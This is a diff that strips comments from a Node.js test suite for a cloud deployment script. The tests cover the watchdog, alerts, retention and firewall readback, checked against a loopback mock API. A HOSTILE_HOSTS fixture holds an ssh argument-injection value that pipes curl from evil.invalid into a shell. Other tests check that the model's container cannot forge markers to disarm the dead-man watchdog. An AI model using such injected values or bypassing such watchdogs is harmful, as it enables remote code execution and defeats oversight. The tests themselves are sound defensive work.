@@ -1,10 +1,3 @@
-// Build order step 6 (work/rnd/agent/2026-09-05-executive-heron-v2-decided.md section 3), against
-// the CTO's spec (2026-09-05-engineering-heron-v2-runtime-and-host.md sections 3-5). Docker stays
-// down on this laptop; nothing here builds an image, creates a droplet, or reaches a network. Every
-// assertion reads a committed file as text or spawns a local script/fixture -- the same discipline
-// test/image.test.mjs and test/tarball.test.mjs already hold this package to.
-//
-// Run: node --test test/host.test.mjs
 
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
@@ -30,10 +23,6 @@ function renderCloudInit(env = {}) {
   assert.equal(result.status, 0, `--render-cloud-init failed: ${result.stderr}`);
   return result.stdout;
 }
-
-// ---------------------------------------------------------------------------
-// 1. The rendered cloud-init is ASCII, YAML-shaped, and carries the required keys.
-// ---------------------------------------------------------------------------
 
 test('the rendered cloud-init passes the ASCII guard (checked RENDERED, never the template)', () => {
   const rendered = renderCloudInit();
@@ -66,9 +55,6 @@ test('the rendered cloud-init is YAML-parseable (PyYAML if present, else a minim
       return;
     }
 
-    // PyYAML is absent on this laptop (verified true as of this step, same as the CTO spec's own
-    // finding); a minimal structural check stands in rather than silently skipping the assertion
-    // or installing a package as a side effect of running the test suite.
     assert.doesNotMatch(rendered, /\t/, 'cloud-init.yaml must not contain a tab character');
     assert.match(rendered, /^#cloud-config/, 'must open with the #cloud-config marker');
     const lines = rendered.split('\n').filter((l) => l.trim() !== '' && !l.trim().startsWith('#'));
@@ -100,9 +86,6 @@ test('the rendered cloud-init carries every key build order step 6 requires', ()
     /curl[^\n]*\|\s*(sh|bash)\b/,
     'a curl-piped-to-shell shape must never appear in cloud-init',
   );
-  // "monitoring" is fine as a word in a comment (explaining why do-agent is purged); what must
-  // never appear is the YAML KEY, which belongs only in the droplet-create API body
-  // (deploy-droplet.sh's create_droplet(), monitoring: False) -- never inside cloud-init itself.
   const nonCommentLines = rendered.split('\n').filter((l) => !l.trim().startsWith('#'));
   for (const line of nonCommentLines) {
     assert.doesNotMatch(
@@ -112,10 +95,6 @@ test('the rendered cloud-init carries every key build order step 6 requires', ()
     );
   }
 });
-
-// ---------------------------------------------------------------------------
-// 2. --plan makes no network call and prints every section the Master reads before create.
-// ---------------------------------------------------------------------------
 
 test('--plan runs with no network and exits 0, printing every required section', () => {
   const dir = mkdtempSync(path.join(os.tmpdir(), 'host-plan-'));
@@ -152,16 +131,11 @@ test('--plan runs with no network and exits 0, printing every required section',
     for (const needle of required) {
       assert.ok(result.stdout.includes(needle), `--plan output is missing: ${needle}`);
     }
-    // No value of the fake token ever appears in the plan's own output.
     assert.ok(!result.stdout.includes('fake-token-not-real'));
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
 });
-
-// ---------------------------------------------------------------------------
-// 3. --create refuses without HERON_DEPLOY_CONFIRMED=1, before any other input is read.
-// ---------------------------------------------------------------------------
 
 test('--create refuses without HERON_DEPLOY_CONFIRMED=1', () => {
   const env = { ...process.env };
@@ -180,10 +154,6 @@ test('--create refuses even with HERON_DEPLOY_CONFIRMED=1 set to the wrong value
   });
   assert.notEqual(result.status, 0, 'only the literal value "1" may confirm a create');
 });
-
-// ---------------------------------------------------------------------------
-// 4. The host-side unit files carry their required directives.
-// ---------------------------------------------------------------------------
 
 function unit(name) {
   return readFileSync(path.join(DO_DIR, 'systemd', name), 'utf8');
@@ -226,25 +196,15 @@ test('heron-retention.service and .timer run the retention binary daily', () => 
 test('heron-retention never removes anything that is not already compressed in archive/ first', () => {
   const script = readFileSync(path.join(DO_DIR, 'bin', 'heron-retention'), 'utf8');
 
-  // Two removals exist in this script and no more: os.remove() for a plain file, after its bytes
-  // have been gzipped into archive/, and shutil.rmtree() for a beat directory, after the .tar.gz
-  // has been written AND read back and its file count compared against the tree. There is no
-  // os.unlink anywhere, and nothing removes anything under archive/ itself.
   assert.doesNotMatch(script, /os\.unlink/);
   assert.equal((script.match(/os\.remove\(/g) ?? []).length, 1, 'exactly one os.remove(), the one after the gzip copy');
   assert.equal((script.match(/shutil\.rmtree\(/g) ?? []).length, 1, 'exactly one shutil.rmtree(), the one after the verified tar.gz');
 
-  // Order is the whole difference between archiving and deleting: the rmtree must come after the
-  // read-back that proves the archive holds every file the tree held.
   const verification = script.indexOf('if len(members) != expected:');
   const rmtree = script.indexOf('shutil.rmtree(');
   assert.ok(verification > 0, 'the archive read-back must exist');
   assert.ok(rmtree > verification, 'shutil.rmtree() must come after the archive has been read back and counted');
 });
-
-// ---------------------------------------------------------------------------
-// 5. The watchdog's 90-minute rule: fires on an old fixture, not on a fresh one.
-// ---------------------------------------------------------------------------
 
 function runWatchdog(stateFile, extraEnv = {}) {
   return spawnSync(WATCHDOG, [], {
@@ -304,10 +264,6 @@ test('the watchdog fires on an absent state file', () => {
   assert.match(result.stderr, /does not exist/);
 });
 
-// ---------------------------------------------------------------------------
-// 6. The alert script's --dry-run prints the message and never reads a key from the environment.
-// ---------------------------------------------------------------------------
-
 test('heron-alert --dry-run prints the message and needs no credential at all', () => {
   const env = { ...process.env };
   delete env.CREDENTIALS_DIRECTORY;
@@ -320,8 +276,6 @@ test('heron-alert --dry-run prints the message and needs no credential at all', 
 test('heron-alert --dry-run never reads a key-shaped environment variable', () => {
   const dir = mkdtempSync(path.join(os.tmpdir(), 'alert-poison-'));
   try {
-    // A poisoned CREDENTIALS_DIRECTORY pointing at a real secret-looking file: if the dry-run
-    // branch touched credential_path()/read_key() at all, this value would leak into stdout.
     const credsDir = path.join(dir, 'creds');
     writeFileSync(dir + '/marker', '', 'utf8');
     const result = spawnSync('python3', [ALERT, 'alive', '--dry-run'], {
@@ -355,11 +309,6 @@ test('heron-alert refuses a missing instance argument', () => {
   assert.match(result.stderr, /usage/);
 });
 
-// ---------------------------------------------------------------------------
-// The retention script: 400 fixture files fall under the 200-file / 512 MB ceiling, and nothing
-// is ever deleted (moved into archive/ and compressed instead).
-// ---------------------------------------------------------------------------
-
 test('retention keeps the newest 200 files and archives (never deletes) the rest', () => {
   const dir = mkdtempSync(path.join(os.tmpdir(), 'retention-'));
   try {
@@ -392,20 +341,6 @@ function readdirCount(dir, { excludeArchive = false } = {}) {
   return entries.filter((name) => !(excludeArchive && name === 'archive')).length;
 }
 
-// ===========================================================================
-// The fix round after Security's SECOND read-only gate on build order step 6
-// (work/rnd/agent/2026-09-05-security-review-heron-v2-step-6-second-read.md):
-// N-1 to N-7, the four requirements in section 3, and the step-9 list in section 5.
-//
-// Same rule as the first round, and it is the rule the whole v2 rebuild exists for: EVERY refusal
-// ships with a fixture that makes it fire, and every one below was run against the code as it
-// stood before its fix and seen to fail there first. The report for this round quotes those runs.
-//
-// Nothing here creates anything in any cloud, touches a key, or reaches a network. lib/do_api.py is
-// run end to end against an HTTP server this file starts on 127.0.0.1, which is the only reason the
-// "created, readback failed, delete it" path is a thing that runs rather than a thing described.
-// ===========================================================================
-
 import { createServer } from 'node:http';
 import { execFile } from 'node:child_process';
 import { mkdirSync, chmodSync, existsSync } from 'node:fs';
@@ -433,11 +368,6 @@ function plan(env = {}) {
 
 const deployText = () => readFileSync(DEPLOY_SCRIPT, 'utf8');
 
-// ---------------------------------------------------------------------------
-// N-1 (high). The model's container could disarm the dead man permanently.
-// ---------------------------------------------------------------------------
-
-/** A stand-in for the two directories that are now two directories. */
 function deadManFixture() {
   const dir = tmpdir('deadman');
   const state = path.join(dir, 'state');
@@ -472,9 +402,6 @@ test('N-1: a forged marker in the CONTAINER-WRITABLE state directory no longer s
   const f = deadManFixture();
   try {
     f.stale();
-    // Exactly what Security demonstrated against the shipped binary: /srv/heron/state is 2770
-    // root:heron and run-flags.txt mounts it read-write into the container as uid 10001, the group
-    // that owns it. This is the file the container can write, in the directory it can write.
     writeFileSync(path.join(f.state, 'degraded'), 'since=1\nlast_notified=99999999999\n', 'utf8');
     writeFileSync(path.join(f.state, 'alerts.jsonl'), '{"event":"recovered"}\n', 'utf8');
 
@@ -486,7 +413,6 @@ test('N-1: a forged marker in the CONTAINER-WRITABLE state directory no longer s
     );
     assert.doesNotMatch(result.stderr, /notice already sent/, 'the forged marker must not be read at all');
     assert.match(result.stderr, /past the 5400s ceiling/);
-    // And the real record went to the root-only directory, not to the one the container holds.
     assert.ok(existsSync(path.join(f.watchdog, 'degraded')), 'the marker belongs in the root-only directory');
     assert.ok(existsSync(path.join(f.watchdog, 'alerts.jsonl')), 'so does the record');
   } finally {
@@ -536,10 +462,6 @@ test('N-1: the watchdog directory is created 0700 root:root, printed by --plan, 
   );
 });
 
-// ---------------------------------------------------------------------------
-// N-2 (medium). The same directory fed text into the Master's mailbox.
-// ---------------------------------------------------------------------------
-
 function alertDryRun(instance, env = {}) {
   return spawnSync('python3', [ALERT, instance, '--dry-run'], {
     encoding: 'utf8',
@@ -552,7 +474,6 @@ test('N-2: the alert REFUSES to read an alerts file under /srv/heron, whatever i
   assert.equal(result.status, 0, 'the notice must still go out');
   assert.match(result.stderr, /refused to read \/srv\/heron\/state\/alerts\.jsonl/);
   assert.match(result.stderr, /the model's container can write/);
-  // And the body is the generic one, worded from the instance alone.
   assert.match(result.stdout, /subject: Heron alert: watchdog/);
 });
 
@@ -593,10 +514,6 @@ test('N-2: the watchdog writes and the alert reads the same root-only directory,
   );
   assert.doesNotMatch(watchdog, /STATE_DIR/, 'the marker must not be derived from the state file any more');
 });
-
-// ---------------------------------------------------------------------------
-// N-3 (medium). The firewall readback ignored a widened source.
-// ---------------------------------------------------------------------------
 
 const ASKED = {
   inbound_rules: [{ protocol: 'tcp', ports: '22', sources: { addresses: ['203.0.113.4'] } }],
@@ -678,15 +595,6 @@ test('N-3: the docstring no longer says the three lists are deliberately ignored
   assert.doesNotMatch(text, /the create body's own droplet_ids/, 'the create body does not send droplet_ids at all');
 });
 
-// ---------------------------------------------------------------------------
-// N-4 (medium). The firewall was created before the rollback trap was armed.
-// ---------------------------------------------------------------------------
-
-/**
- * An HTTP server on 127.0.0.1 that answers like DigitalOcean. This is how the one path that
- * matters -- POST succeeded, readback did not match, now what -- is RUN rather than described.
- * No account, no token, no network beyond the loopback interface.
- */
 async function doServer(handlers) {
   const seen = [];
   const server = createServer((req, res) => {
@@ -714,11 +622,6 @@ async function doServer(handlers) {
   };
 }
 
-/**
- * ASYNC on purpose. spawnSync blocks node's one thread, so the server started above -- which lives
- * in this same process -- could never answer the call, and every request timed out after thirty
- * seconds. execFile leaves the event loop free to serve it.
- */
 function runApi(args, base, extraEnv = {}) {
   return new Promise((resolve) => {
     execFile(
@@ -748,7 +651,7 @@ test('N-4: a firewall whose readback is widened is DELETED by the very call that
     },
   });
   const server = await doServer((method, url) => {
-    if (method === 'POST' && url === '/v2/tags') return { status: 201, body: { tag: { name: 'heron-v2' } } }; // the tag must exist before a firewall targets it
+    if (method === 'POST' && url === '/v2/tags') return { status: 201, body: { tag: { name: 'heron-v2' } } };
     if (method === 'POST' && url === '/v2/firewalls') return { status: 201, body: { firewall: widened } };
     if (method === 'GET' && url === '/v2/firewalls/fw-1') return { body: { firewall: widened } };
     if (method === 'DELETE' && url === '/v2/firewalls/fw-1') return null;
@@ -775,7 +678,6 @@ test('N-4: a firewall whose readback is widened is DELETED by the very call that
       `the firewall it made was left on the account. Calls seen: ${server.seen.join(', ')}`,
     );
     assert.match(result.stderr, /firewall fw-1 deleted/);
-    // And the id was written down before any of that could fail.
     assert.equal(
       readFileSync(idFile, 'utf8').trim(),
       'fw-1',
@@ -791,7 +693,7 @@ test('N-4: a firewall whose readback matches is kept, and its id is printed', as
   const dir = tmpdir('fwok');
   const good = echoOf();
   const server = await doServer((method, url) => {
-    if (method === 'POST' && url === '/v2/tags') return { status: 201, body: { tag: { name: 'heron-v2' } } }; // the tag must exist before a firewall targets it
+    if (method === 'POST' && url === '/v2/tags') return { status: 201, body: { tag: { name: 'heron-v2' } } };
     if (method === 'POST' && url === '/v2/firewalls') return { status: 201, body: { firewall: good } };
     if (method === 'GET' && url === '/v2/firewalls/fw-1') return { body: { firewall: good } };
     return { status: 404, body: {} };
@@ -830,8 +732,6 @@ test('N-4: the rollback trap covers a firewall that never returned its id', () =
       writeFileSync(file, `#!/usr/bin/env bash\n${body}\n`, 'utf8');
       chmodSync(file, 0o755);
     };
-    // The exact shape of the finding: do_api.py records the id and then exits non-zero, so
-    // `HERON_FIREWALL_ID="$(create_firewall)"` never assigns anything.
     stub('check_image_slug', 'exit 0');
     stub('check_no_existing_firewall', 'exit 0');
     stub(
@@ -901,21 +801,13 @@ test('N-4: do_api.py refuses an api base that is neither DigitalOcean nor loopba
   }
 });
 
-// ---------------------------------------------------------------------------
-// N-5 (low-medium). --plan named a control that did not exist.
-// ---------------------------------------------------------------------------
-
-/** The precondition rows as the script declares them: [function, the sentence --plan prints]. */
 function declaredPreconditions() {
   const text = deployText();
   const open = text.indexOf('CREATE_PRECONDITIONS=(');
   const block = text.slice(open, text.indexOf('\n)\n', open));
-  // The rows are bash double-quoted strings, so a backtick in one is written \` in the file and
-  // arrives as ` at runtime. Compare what the shell produces, not what the source spells.
   return [...block.matchAll(/^\s*"([a-z_]+)\|(.+)"$/gm)].map((m) => [m[1], m[2].replace(/\\(.)/g, '$1')]);
 }
 
-/** The numbered list --plan actually prints to the Master. */
 function printedPreconditions(text) {
   const start = text.indexOf('== What --create does ==');
   const end = text.indexOf('Then, and only then:', start);
@@ -989,10 +881,6 @@ test('N-5: --plan names exactly the files post-boot-assert.sh asserts, and no lo
   assert.match(text, /It asserts no other file's mode/);
 });
 
-// ---------------------------------------------------------------------------
-// N-6 (low). /srv/heron/chain.json was created by nothing.
-// ---------------------------------------------------------------------------
-
 test('N-6: cloud-init creates chain.json at the owner and mode the signer needs', () => {
   const yaml = readFileSync(CLOUD_INIT_FILE, 'utf8');
   assert.match(
@@ -1014,10 +902,6 @@ test('N-6: the path cloud-init creates is the path heron-purse.service names', (
   assert.equal(chain[1], '/srv/heron/chain.json');
   assert.match(readFileSync(CLOUD_INIT_FILE, 'utf8'), new RegExp(chain[1].replace(/[/.]/g, '\\$&')));
 });
-
-// ---------------------------------------------------------------------------
-// N-7 (low). HERON_HOST was not validated.
-// ---------------------------------------------------------------------------
 
 const HOSTILE_HOSTS = [
   '-oProxyCommand=curl http://evil.invalid|sh',
@@ -1060,16 +944,10 @@ test('N-7: a legitimate ops@<ip> is accepted, and every ssh/scp passes its targe
   for (const line of deployText().split('\n')) {
     const trimmed = line.trim();
     const invocation = /(?:^|\|\s*|until\s+)(?:ssh|scp)\s+(.*)$/.exec(trimmed);
-    // --plan's own prose contains the words "ssh key:"; what this is about is an invocation that
-    // carries a TARGET, which on this host is always ops@... or $ssh_target.
     if (!invocation || !/ops@|\$ssh_target/.test(invocation[1])) continue;
     assert.match(trimmed, /(^|\s)-- /, `an ssh/scp invocation with no -- separator: ${trimmed}`);
   }
 });
-
-// ---------------------------------------------------------------------------
-// Section 3's four requirements.
-// ---------------------------------------------------------------------------
 
 test('section 3: the alert unit gets AF_UNIX and AF_NETLINK, with the reason in the unit', () => {
   const svc = readFileSync(path.join(DO_DIR, 'systemd', 'heron-alert@.service'), 'utf8');
@@ -1099,10 +977,6 @@ test('section 3: the post-boot check proves /usr/bin/node exists and prints its 
   assert.match(text, /\[ -x "\$NODE_BIN" \] \|\| fail/);
   assert.match(text, /"\$NODE_BIN" --version/);
 });
-
-// ---------------------------------------------------------------------------
-// --smoke: the mail drill is a hard gate BEFORE the beat timer is enabled.
-// ---------------------------------------------------------------------------
 
 function smokeStubs({ failAt } = {}) {
   const dir = tmpdir('smoke');
@@ -1186,10 +1060,6 @@ test('--smoke: heron-alert knows the smoke instance, so the drill arrives worded
   assert.match(result.stdout, /No timer was enabled until this message was accepted/);
 });
 
-// ---------------------------------------------------------------------------
-// The lifted HERON_NO_NETWORK refusal in cmd_create.
-// ---------------------------------------------------------------------------
-
 test('the lift: without HERON_DEPLOY_CONFIRMED=1, --create refuses and reaches nothing', () => {
   const env = { ...process.env };
   delete env.HERON_DEPLOY_CONFIRMED;
@@ -1204,7 +1074,7 @@ test('the lift: with the word but a failing precondition, --create refuses namin
   try {
     const token = path.join(dir, 'do-token');
     writeFileSync(token, 'not-a-real-token\n', 'utf8');
-    chmodSync(token, 0o644); // the one thing check_do_token_file refuses
+    chmodSync(token, 0o644);
     const sshKey = path.join(dir, 'id_ed25519.pub');
     writeFileSync(sshKey, 'ssh-ed25519 AAAAfaketest fake\n', 'utf8');
     const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], {
@@ -1236,10 +1106,6 @@ test('the lift: cmd_create no longer carries the unconditional HERON_NO_NETWORK 
   assert.match(create, /for entry in "\$\{CREATE_PRECONDITIONS\[@\]\}"/, 'the preconditions must run from the array');
 });
 
-// ---------------------------------------------------------------------------
-// Step 9's on-host assertions (section 5), as a file that runs here.
-// ---------------------------------------------------------------------------
-
 function smokeHostFixture({
   chainMode = 0o600,
   chainBody = '{"network":"mainnet"}',
@@ -1254,8 +1120,6 @@ function smokeHostFixture({
     writeFileSync(file, body, 'utf8');
     chmodSync(file, 0o755);
   };
-  // `sudo -u #10002 cmd` runs cmd; this laptop cannot change uid, so the stub stands in for the
-  // privilege drop and what is actually asserted here is the file's own readability and content.
   write('sudo', '#!/usr/bin/env bash\nif [ "${1:-}" = "-u" ]; then shift 2; fi\nexec "$@"\n');
   write(
     'systemd-run',
@@ -1374,8 +1238,6 @@ test('step 9: --smoke reads the effective ruleset for the tag from the ACCOUNT, 
   try {
     const result = await runApi(['firewall-effective', tokenFile(dir), 'heron-v2'], server.base);
     assert.equal(result.status, 0, result.stderr);
-    // The whole reason this reads the account: a SECOND firewall on the tag admits what the first
-    // firewall's own echo cannot show.
     assert.match(result.stdout, /2 firewall\(s\)/);
     assert.match(result.stdout, /somebody-elses-fw/);
     assert.match(result.stdout, /inbound {2}tcp\/80/);
